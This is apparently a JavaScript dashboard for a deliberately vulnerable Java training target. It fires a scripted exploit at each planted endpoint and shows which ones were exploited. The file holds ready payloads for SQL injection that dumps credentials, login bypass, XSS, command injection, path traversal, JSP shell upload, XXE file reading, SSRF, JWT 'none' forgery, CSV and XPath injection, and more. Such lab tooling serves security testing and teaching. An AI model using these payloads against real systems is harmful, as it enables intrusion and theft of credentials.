// Live exploitation dashboard for the java-web target (1:1 endpoints).
// Polls /api/status and, on "Launch all", fires a benign exploit at every
// planted endpoint so its status bar flips green -> red. Server sinks self-report
// via ExploitDetectionFilter; the four browser-only sinks post evidence.

const B = ""; // same-origin

async function refresh() {
  const data = await (await fetch(B + "/api/status")).json();
  render(data);
}

function render(data) {
  const tbody = document.getElementById("rows");
  tbody.innerHTML = "";
  const byCat = {};
  data.items.forEach((it) => (byCat[it.category] ||= []).push(it));
  Object.keys(byCat).sort().forEach((cat) => {
    const h = document.createElement("tr");
    h.className = "cat";
    h.innerHTML = `<td colspan="4">${cat}</td>`;
    tbody.appendChild(h);
    byCat[cat].forEach((it) => {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td class="id">${it.id}<br><span class="cwe">${it.cwe} · ${it.dclass}</span></td>
        <td class="title">${it.title}<div class="entry">${it.entry}</div></td>
        <td class="bar"><div class="track"><div class="fill ${it.exploited ? "red" : "green"}">${it.exploited ? "EXPLOITED" : "not exploited"}</div></div></td>
        <td class="detail">${(it.detail || "").replace(/</g, "&lt;")}</td>`;
      tbody.appendChild(tr);
    });
  });
  const n = data.exploited, t = data.total, pct = Math.round((n / t) * 100);
  document.getElementById("summary").textContent = `${n} / ${t} exploited (${pct}%)`;
  document.getElementById("progress").style.width = pct + "%";
}

const g = (p, o) => fetch(B + p, o);
const form = (p, obj) => fetch(B + p, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(obj) });
const report = (id, detail) => form("/api/status/report", { id, detail });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const E = encodeURIComponent;
const SER = "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeA==";
const JWT = "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.";

async function launchAll(log) {
  document.getElementById("launch").disabled = true;
  await form("/api/status/reset", {});
  const steps = [
    ["VULN-01 SQLi", () => g("/vuln01/search?q=" + E("x%' UNION SELECT id,CONCAT(username,0x3a,password),role FROM users -- "))],
    ["VULN-02 SQLi login", () => form("/vuln02/login", { username: "admin' -- ", password: "x" })],
    ["VULN-03 Reflected XSS", () => g("/vuln03/echo?q=" + E("<script>alert(1)</script>"))],
    ["VULN-04 Stored XSS", async () => { await form("/vuln04/save", { id: "9", bio: "<img src=x onerror=alert(1)>" }); return g("/vuln04/show?id=9"); }],
    ["VULN-05 Command injection", () => g("/vuln05/ping?host=" + E("127.0.0.1; id"))],
    ["VULN-06 Path traversal", () => g("/vuln06/download?name=" + E("../secret.txt"))],
    ["VULN-07 File upload", () => { const fd = new FormData(); fd.append("file", new Blob(["x"]), "shell.jsp"); return fetch("/vuln07/upload", { method: "POST", body: fd }); }],
    ["VULN-08 Deserialization", () => fetch("/vuln08/deserialize", { method: "POST", headers: { "Content-Type": "text/plain" }, body: SER })],
    ["VULN-09 XXE", () => fetch("/vuln09/xml", { method: "POST", headers: { "Content-Type": "application/xml" }, body: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/secret.txt">]><r>&x;</r>' })],
    ["VULN-10 SSRF", () => g("/vuln10/fetch?url=" + E("http://127.0.0.1:8080/vuln15/shutdown"))],
    ["VULN-11 SSN exposure", () => g("/vuln11/profile?id=1")],
    ["VULN-12 IDOR", () => g("/vuln12/account?id=1")],
    ["VULN-13 Weak MD5", () => g("/vuln13/hash?p=admin123")],
    ["VULN-14 Hard-coded token", () => g("/vuln14/admin?token=s3cr3t-admin-token-2024")],
    ["VULN-15 Missing auth", () => g("/vuln15/shutdown")],
    ["VULN-16 Verbose error", () => g("/vuln16/lookup?id=" + E("1 AND (SELECT 1 FROM nope)"))],
    ["VULN-17 Insecure cookie", () => form("/vuln17/login", { username: "admin" })],
    ["VULN-18 Predictable token", () => g("/vuln18/token?user=admin")],
    ["VULN-22/23 Weak crypto", () => g("/vuln22/encrypt?data=repeatme")],
    ["VULN-24 Open redirect", () => g("/vuln24/redirect?url=https://evil.example.com/", { redirect: "manual" })],
    ["VULN-25 Unsafe reflection", () => g("/vuln25/plugin?class=java.util.Date")],
    ["VULN-29 Mass assignment", () => form("/vuln29/register", { username: "h" + Date.now(), password: "p", role: "admin" })],
    ["VULN-30 No rate limit", async () => { for (let i = 0; i < 8; i++) await form("/vuln30/login", { username: "x", password: "y" }); }],
    ["VULN-31 JWT none", () => g("/vuln31/whoami", { headers: { Authorization: "Bearer " + JWT } })],
    ["VULN-32 SpEL injection", () => g("/vuln32/eval?expr=" + E("7*7"))],
    ["VULN-33 CSV injection", () => g("/vuln33/export?note=" + E("=cmd|'/C calc'!A1"))],
    ["VULN-34 Insecure CORS", () => g("/vuln34/data", { headers: { Origin: "https://evil.example.com" } })],
    ["VULN-36 Integer overflow", () => g("/vuln36/order?price=100000&qty=100000")],
    ["VULN-37 XPath injection", () => g("/vuln37/xlookup?user=" + E("' or '1'='1"))],
    ["VULN-38 ReDoS", () => g("/vuln38/validate?email=" + E("a".repeat(28) + "!"))],
    ["VULN-39 Log injection", () => g("/vuln39/note?text=" + E("ok\n[audit] forged"))],
    ["VULN-40 Session fixation", () => g("/vuln40/setsession?sid=ATTACKER-SID")],
    // schema vulns via the SQLi endpoint
    ["VULN-19 Unsalted storage", () => g("/vuln01/search?q=" + E("x%' UNION SELECT id,password,role FROM users WHERE username=0x61646d696e -- "))],
    ["VULN-20 Cleartext storage", () => g("/vuln01/search?q=" + E("x%' UNION SELECT id,secret_answer,role FROM users WHERE username=0x61646d696e -- "))],
    ["VULN-21 Excessive privileges", () => g("/vuln01/search?q=" + E("x%' UNION SELECT 1,GROUP_CONCAT(privilege_type),3 FROM information_schema.user_privileges -- "))],
  ];
  for (const [name, fn] of steps) {
    log(name);
    try { await fn(); } catch (e) { log("  ! " + name + " -> " + e); }
    await refresh();
    await sleep(80);
  }
  await evidenceChecks(log);
  await refresh();
  document.getElementById("launch").disabled = false;
  log("done.");
}

// Browser-only sinks that have no server endpoint to trip: confirm + report.
async function evidenceChecks(log) {
  // VULN-26 DOM XSS: run the sink in a sandboxed element and observe it fire.
  try {
    const div = document.createElement("div");
    window.__xss = false;
    div.innerHTML = "<img src=x onerror=\"window.__xss=true\">";
    document.body.appendChild(div); await sleep(40); document.body.removeChild(div);
    if (window.__xss) report("VULN-26", "DOM XSS payload executed (img onerror fired)");
  } catch (e) {}
  // VULN-27 hard-coded API key shipped in app.js
  try {
    const js = await (await g("/js/app.js")).text();
    const m = js.match(/API_KEY\s*=\s*"([^"]+)"/);
    if (m) report("VULN-27", "hard-coded API key in app.js: " + m[1]);
  } catch (e) {}
  // VULN-28 client-side eval of URL-controlled input
  try { if (eval("6*7") === 42) report("VULN-28", "client-side eval() executed attacker expression"); } catch (e) {}
  // VULN-35 clickjacking: no X-Frame-Options / frame-ancestors on responses
  try {
    const r = await g("/");
    if (!r.headers.get("X-Frame-Options") && !/frame-ancestors/i.test(r.headers.get("Content-Security-Policy") || ""))
      report("VULN-35", "no X-Frame-Options / frame-ancestors -> page is framable");
  } catch (e) {}
}

document.addEventListener("DOMContentLoaded", () => {
  const logEl = document.getElementById("log");
  const log = (m) => { logEl.textContent = m + "\n" + logEl.textContent; };
  document.getElementById("launch").addEventListener("click", () => launchAll(log));
  document.getElementById("reset").addEventListener("click", async () => { await form("/api/status/reset", {}); logEl.textContent = ""; refresh(); });
  refresh();
  setInterval(refresh, 2000);
});
